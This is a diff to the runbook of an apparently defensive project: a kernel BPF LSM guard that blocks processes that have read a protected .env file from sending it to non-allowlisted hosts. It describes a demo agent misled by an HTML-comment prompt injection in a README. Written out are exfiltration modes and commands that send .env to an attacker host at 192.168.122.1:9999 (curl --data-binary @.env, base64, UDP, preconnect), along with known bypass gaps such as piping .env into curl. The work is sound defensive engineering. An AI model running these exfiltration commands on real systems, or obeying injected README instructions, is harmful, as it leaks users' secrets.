@@ -45,26 +45,28 @@ Do not edit: `tests/test_policy.py` (Hifza), `tests/test_events.py` (Divyanshu),
 
 All demo/test tools: Python 3 stdlib only (plus `curl`/`nc` where noted).
 
-**`demo/agent.py --env PATH --api URL --target HOST:PORT --exfil MODE [--step]`**
+**`demo/agent.py --mode MODE [--env PATH] [--attacker HOST] [--port 9999] [--api http://127.0.0.1:8080]`**
+
+`--attacker` defaults to the default-route gateway (the libvirt host, usually 192.168.122.1) and must not be loopback. One mode per run, then it exits.
 
 1. Reads `.env`, which gets it tagged.
-2. POSTs a summary to `--api`. Allowed; prints success.
+2. POSTs to `--api` + `/query`. Allowed; prints the status.
 3. "Follows the README": attempts exfil per `MODE`:
    - `direct`: Python TCP connect + send
-   - `curl`: `subprocess` runs `curl -d <data>` (tests inheritance)
-   - `udp`: `sendto`
+   - `curl`: `subprocess` runs `curl -sS --data-binary @.env` (tests inheritance)
    - `b64`: base64 then direct
-   - `preconnect`: connect to the target *before* step 1, then read `.env`, then send
-   - `none`
-4. Prints `BLOCKED by kernel (EPERM)` on `PermissionError`/`EPERM`; prints any other error verbatim.
+   - `ipv6`: IPv4-mapped IPv6 (`::ffff:<attacker>`), checked as IPv4 by hook B
+   - `udp`: `sendto`. **NOT BLOCKED until hook C lands** (hook C, `socket_sendmsg`, is not in the kernel yet)
+   - `preconnect`: connect to the target *before* reading `.env`, then send. **NOT BLOCKED until hook C lands** (hook C, `socket_sendmsg`, is not in the kernel yet)
+4. Prints `BLOCKED by the guard: [errno 1] ...` only on `EPERM`; any other error is reported as "no guard involved".
 
-`--step` waits for Enter between phases (stage pacing). For `curl` mode, check the subprocess exit code: curl returns `7` when it can't connect. Exit 7 also covers "connection refused", so `attack_matrix.py` must confirm the block another way (the guard's `BLOCK` event for that run), not from exit 7 alone.
+For `curl` mode the EPERM lands in the child: the agent prints `BLOCKED by the guard (curl: Operation not permitted)` when curl's stderr says so. curl exit `7` without that text means connection refused, not a block, so `attack_matrix.py` confirms curl blocks from the guard's `BLOCK` event.
 
-**`demo/internal_api.py --port 8080`**: stdlib HTTP server on `127.0.0.1`. `POST /ingest` returns 200 and logs the byte count.
+**`demo/internal_api.py --port 8080`**: stdlib HTTP server on `127.0.0.1`. `POST /query` returns 200 JSON; `GET /health` for a liveness check. Logs one line per request.
 
-**`demo/attacker.py --port 9999`**: runs on the **host laptop**. TCP + UDP listener on `0.0.0.0`. Prints a loud, timestamped `RECEIVED n bytes` line when anything arrives; otherwise a quiet "waiting".
+**`demo/attacker.py --port 9999`**: runs on the **host laptop**. TCP + UDP listener on `0.0.0.0`. Prints a timestamped `TCP got n bytes from ...` / `UDP got n bytes from ...` line with the payload when anything arrives.
 
-**`demo/reset.sh`**: kills leftover `agent.py` / `internal_api.py` / `curl`, restarts `internal_api.py`, clears the screen.
+**`demo/reset.sh`**: kills leftover `agent.py` / `curl`, restarts `internal_api.py` (log `/tmp/internal_api.log`), checks the hooks are still loaded (`sudo -n`, never prompts). Leaves the guard | bridge pipeline, attacker and dashboard running.
 
 **`demo/project/.env`**: obviously fake values that don't look like real key formats (e.g. `DB_PASSWORD=demo-password-not-real`, `PAYMENT_API_KEY=DEMO-KEY-0000-FAKE`). No real-looking prefixes (`sk-`, `AKIA`, `ghp_`) so push protection isn't triggered.
 
@@ -83,8 +85,8 @@ Check for `EPERM` specifically, not just "failed". A timeout or connection refus
 | Base64 / any encoding | Content is never inspected; the process is tagged |
 | Any port (matrix tries 9999 and 4444) | Allowlist is by address |
 | IPv4-mapped IPv6 (`::ffff:192.168.122.1`) | Hooks B/C |
-| UDP `sendto()` | Hook C |
-| Socket connected *before* reading the secret, then `send()` | Hook C checks the connected peer |
+| UDP `sendto()` | Hook C. **NOT BLOCKED until hook C lands** (hook C, `socket_sendmsg`, is not in the kernel yet) |
+| Socket connected *before* reading the secret, then `send()` | Hook C checks the connected peer. **NOT BLOCKED until hook C lands** (hook C, `socket_sendmsg`, is not in the kernel yet) |
 
 Nothing needs to listen on 4444: a block is `EPERM` before any packet leaves, and anything else (refused, timeout) is a fail. Native IPv6 is not in the matrix (dropped 18 Oct: the libvirt network may have no IPv6 routing, not worth a day). IPv4-mapped IPv6 rides IPv4 routing, so it stays.
 
@@ -129,8 +131,9 @@ sudo python3 scripts/lsm_smoke_test.py     # 5 trace lines, "OK: BPF LSM works."
 # Without the guard (any Linux box): everything should SUCCEED
 python3 demo/internal_api.py --port 8080 &
 python3 demo/attacker.py --port 9999 &
-python3 demo/agent.py --env demo/project/.env --api http://127.0.0.1:8080/ingest \
-  --target 127.0.0.1:9999 --exfil direct    # attacker prints RECEIVED n bytes
+python3 demo/agent.py --mode direct --env demo/project/.env --port 9999 \
+  --attacker "$(hostname -I | cut -d' ' -f1)" --api http://127.0.0.1:8080   # attacker prints TCP got n bytes
+# (the agent refuses a loopback attacker: 127.0.0.0/8 is allowlisted)
 
 # Real, VM + host (see runbook below)
 sudo python3 tests/attack_matrix.py --target 192.168.122.1:9999
@@ -165,8 +168,8 @@ demo/reset.sh                                                          # starts 
 
 1. Dashboard green "Protected"; point at the policy panel (protected `.env`, allowlist = loopback).
 2. Show the poisoned README: `cat demo/project/README.md` (the HTML comment is the injection).
-3. Control: an untagged process reaches the attacker. `python3 -c "import socket; socket.create_connection(('192.168.122.1',9999)).sendall(b'hello')"` → attacker prints `RECEIVED 5 bytes`. "Not a firewall."
-4. The attack: `python3 demo/agent.py --env demo/project/.env --api http://127.0.0.1:8080/ingest --target 192.168.122.1:9999 --exfil curl --step`. Enter through phases: TAG, the allowed POST (ALLOW), curl inherits the tag, `BLOCKED by kernel (EPERM)`, banner red, attacker silent.
+3. Control: an untagged process reaches the attacker. `python3 -c "import socket; socket.create_connection(('192.168.122.1',9999)).sendall(b'hello')"` → attacker prints `TCP got 5 bytes`. "Not a firewall."
+4. The attack: `python3 demo/agent.py --mode curl --env demo/project/.env --attacker 192.168.122.1 --port 9999 --api http://127.0.0.1:8080`. It runs straight through: TAG, the allowed POST (ALLOW), curl inherits the tag, `BLOCKED by the guard (curl: Operation not permitted)`, banner red, attacker silent.
 5. Close on the rule: read a protected file → only allowlisted destinations, enforced in the kernel.
 
 **Backup video:** you record it; Azaan verifies it.
@@ -185,7 +188,7 @@ The bridge can't reattach to a new guard (its stdin is closed for good), so neve
 
 **Between runs:** `demo/reset.sh`. For a cold run, revert the VM snapshot.
 
-**Judges** may try rows from the "Blocked" table only (other `--exfil` modes, other ports, base64), never native IPv6 (not set up). **Never invite pipes** (`cat .env | curl ...`): that's a known gap.
+**Judges** may try only: `--mode direct`, `--mode curl`, `--mode b64`, and other ports (`--port 4444`). Never `udp` or `preconnect` until hook C has landed (they are not blocked), never native IPv6 (not set up). **Never invite pipes** (`cat .env | curl ...`): that's a known gap.
 
 **If something fails on stage:** Electron dies → open `dashboard/renderer/index.html?bridge=ws://<vm-ip>:8765` in a browser. Guard won't load or VM networking breaks → play the backup video. Attacker receives bytes → stop the live demo, say so plainly, switch to the video.
 
